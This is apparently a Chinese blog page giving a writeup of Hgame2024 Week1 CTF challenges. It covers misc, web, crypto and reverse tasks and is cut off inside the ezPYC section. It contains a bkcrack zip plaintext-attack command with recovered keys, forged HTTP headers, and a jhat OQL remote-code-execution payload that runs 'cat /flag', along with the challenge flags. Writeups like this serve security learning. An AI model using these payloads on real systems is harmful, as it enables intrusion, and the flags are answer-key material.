@@ -1,0 +1,837 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.0" theme-name="Stellar" theme-version="1.29.0">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>Hgame2024 Week1-Writeup - Joooook's Blog</title>
+
+  
+    <meta name="description" content="Week1目录 Misc 来自星尘的问候 希儿希儿希尔 simple-attack   Web Bypass it ezHTTP Select Courses 2048*16 jhat   Re ezPYC   Crypto ezRSA ezMath ezPRNG 奇怪的图片   Pwn ezshellcode Elden Random Challenge ezfmt string Elden">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2024 Week1-Writeup">
+<meta property="og:url" content="http://example.com/2024/02/05/Hgame2024-Week1%20Writeup/index.html">
+<meta property="og:site_name" content="Joooook&#39;s Blog">
+<meta property="og:description" content="Week1目录 Misc 来自星尘的问候 希儿希儿希尔 simple-attack   Web Bypass it ezHTTP Select Courses 2048*16 jhat   Re ezPYC   Crypto ezRSA ezMath ezPRNG 奇怪的图片   Pwn ezshellcode Elden Random Challenge ezfmt string Elden">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.31.32_AbvRZ1bQtJ.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.47.18_HU4AkWja5V.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.47.42_AADwEjUIzF.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.58.17_zK70h71SkY.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2022.01.48_forarLdIE0.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2022.02.36_n2A8IoxSp3.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.37.29_6I-uMBgKvA.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.02_9MoNsqmmip.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.42_O3TsVyfdME.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.58_wf7_-_6IGo.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2013.32.19_WZIiIfA4HV.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2014.32.17_CgNzkFHFCX.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2014.46.27_iMMPpG2Z2q.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2015.45.57_O7k7vLgdRx.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2017.26.09_bKW36FAONI.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-01%2023.28.22_58k_N2Uq9c.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2010.12.10_Mwyv9TV6DV.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2010.21.14_gvfqXkX6Kh.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.11.33_PyhOKuBzQf.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.13.47_qeqY9cGbjy.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2014.14.30_Hq-4oevtL3.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.04.51_eD7cjXP85Y.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.05.18_5trFNp14Rb.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.10.02_qlz6EOignb.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2016.57.01_X3RKjuLVPq.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2016.58.24_RLwzWlD__Q.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2019.09.46_LjMVE5ol0y.png">
+<meta property="og:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2013.45.26_PPvouEFpBv.png">
+<meta property="article:published_time" content="2024-02-05T05:31:27.920Z">
+<meta property="article:modified_time" content="2024-02-07T12:32:50.061Z">
+<meta property="article:author" content="Joooook">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="2024">
+<meta property="article:tag" content="hgame">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.31.32_AbvRZ1bQtJ.png">
+  
+  
+  
+  <meta name="keywords" content="ctf,2024,hgame">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.0">
+
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="undefined" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Joooook's Blog</div><div class="sub normal cap">Joooook</div><div class="sub hover cap" style="opacity:0">Per aspera ad astra</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/29/H264%E7%BC%96%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E5%86%99%E5%AE%9E%E8%B7%B5/"><span class="title">H264编码分析及隐写实践</span></a><a class="item title" href="/2024/04/23/GZCTF%E5%B9%B3%E5%8F%B0%E5%AF%B9%E6%8E%A5QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"><span class="title">GZCTF平台对接QQ机器人</span></a><a class="item title" href="/2024/03/22/%E7%AE%80%E6%9E%90Go%20SSTI%E5%88%A9%E7%94%A8/"><span class="title">简析Go SSTI利用</span></a><a class="item title" href="/2024/02/05/Hgame2024-Week1%20Writeup/"><span class="title">Hgame2024 Week1-Writeup</span></a><a class="item title" href="/2024/02/05/UWSP%20Pointer%20Overflow%20CTF/"><span class="title">UWSP Pointer Overflow CTF-Writeup</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Writeups/">Writeups</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-05T05:31:27.920Z">2024-02-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-07T12:32:50.061Z">2024-02-07</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Hgame2024 Week1-Writeup</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><span id="more"></span>
+<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#Misc">Misc</a><ul>
+<li><a href="#%E6%9D%A5%E8%87%AA%E6%98%9F%E5%B0%98%E7%9A%84%E9%97%AE%E5%80%99">来自星尘的问候</a></li>
+<li><a href="#%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%B0%94">希儿希儿希尔</a></li>
+<li><a href="#simple-attack">simple-attack</a></li>
+</ul>
+</li>
+<li><a href="#Web">Web</a><ul>
+<li><a href="#Bypass-it">Bypass it</a></li>
+<li><a href="#ezHTTP">ezHTTP</a></li>
+<li><a href="#Select-Courses">Select Courses</a></li>
+<li><a href="#204816">2048*16</a></li>
+<li><a href="#jhat">jhat</a></li>
+</ul>
+</li>
+<li><a href="#Re">Re</a><ul>
+<li><a href="#ezPYC">ezPYC</a></li>
+</ul>
+</li>
+<li><a href="#Crypto">Crypto</a><ul>
+<li><a href="#ezRSA">ezRSA</a></li>
+<li><a href="#ezMath">ezMath</a></li>
+<li><a href="#ezPRNG">ezPRNG</a></li>
+<li><a href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%9B%BE%E7%89%87">奇怪的图片</a></li>
+</ul>
+</li>
+<li><a href="#Pwn">Pwn</a><ul>
+<li><a href="#ezshellcode">ezshellcode</a></li>
+<li><a href="#Elden-Random-Challenge">Elden Random Challenge</a></li>
+<li><a href="#ezfmt-string">ezfmt string</a></li>
+<li><a href="#Elden-Ring-%E2%85%A0">Elden Ring Ⅰ</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.31.32_AbvRZ1bQtJ.png"></p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://my1l.github.io/Ctrl/CtrlAstr.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://my1l.github.io/Ctrl/CtrlAstr.html" autofill="title,icon"><div class="left"><span class="title">https://my1l.github.io/Ctrl/CtrlAstr.html</span><span class="cap link footnote">https://my1l.github.io/Ctrl/CtrlAstr.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;welc0me!&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h2><p>crc修复</p>
+<p>lsb隐写</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.47.18_HU4AkWja5V.png"></p>
+<p>hill加密</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.47.42_AADwEjUIzF.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">DISAPPEARINTHESEAOFBUTTERFLY</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple-attack"></a>simple-attack</h2><p>zip明文攻击</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./bkcrack -C /<span class="title class_">Users</span>/zhou39512/<span class="variable constant_">CTF</span>/<span class="title class_">HGAME2024</span>/<span class="title class_">Week1</span>/<span class="title class_">Misc</span>/simple_attack/src/attachment.<span class="property">zip</span> -c 103223779_p0.<span class="property">jpg</span> -P /<span class="title class_">Users</span>/zhou39512/<span class="variable constant_">CTF</span>/<span class="title class_">HGAME2024</span>/<span class="title class_">Week1</span>/<span class="title class_">Misc</span>/simple_attack/src/src.<span class="property">zip</span> -p 103223779_p0.<span class="property">jpg</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html" autofill="title,icon"><div class="left"><span class="title">https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html</span><span class="cap link footnote">https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p>生成新密码为123的zip</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bkcrack -C /<span class="title class_">Users</span>/zhou39512/<span class="variable constant_">CTF</span>/<span class="title class_">HGAME2024</span>/<span class="title class_">Week1</span>/<span class="title class_">Misc</span>/simple_attack/src/attachment.<span class="property">zip</span> -c 103223779_p0.<span class="property">jpg</span> -k e423add9 375dcd1c 1bce583e -U new_zip_123.<span class="property">zip</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>解压得到</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2020.58.17_zK70h71SkY.png"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>不给注册，直接向register.php发请求就能注册成功</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2022.01.48_forarLdIE0.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-29%2022.02.36_n2A8IoxSp3.png"></p>
+<h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-real-Ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line">Referer:vidar.club</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;<span class="variable constant_">HTTP_</span>!s_1mP0rT4nt&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>无大语，有人随机退课，一直选课就行，总能选到</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.37.29_6I-uMBgKvA.png"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>js混淆</p>
+<p>搜索won定位到关键处</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.02_9MoNsqmmip.png"></p>
+<p>直接所有代码复制</p>
+<p>打印<code>t</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.42_O3TsVyfdME.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2012.56.58_wf7_-_6IGo.png"></p>
+<h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>OQL RCE</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://www.wenjiangs.com/doc/7tsoxdy9nldr" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://www.wenjiangs.com/doc/7tsoxdy9nldr" autofill="title,icon"><div class="left"><span class="title">https://www.wenjiangs.com/doc/7tsoxdy9nldr</span><span class="cap link footnote">https://www.wenjiangs.com/doc/7tsoxdy9nldr</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md" autofill="title,icon"><div class="left"><span class="title">https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md</span><span class="cap link footnote">https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2013.32.19_WZIiIfA4HV.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;cat /flag&#x27;</span>).getInputStream();</span><br><span class="line">b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(a);</span><br><span class="line">c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(b);</span><br><span class="line"><span class="keyword">while</span>(c.ready())&#123;</span><br><span class="line">d+=c.readLine()+<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>pycdas反编译</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 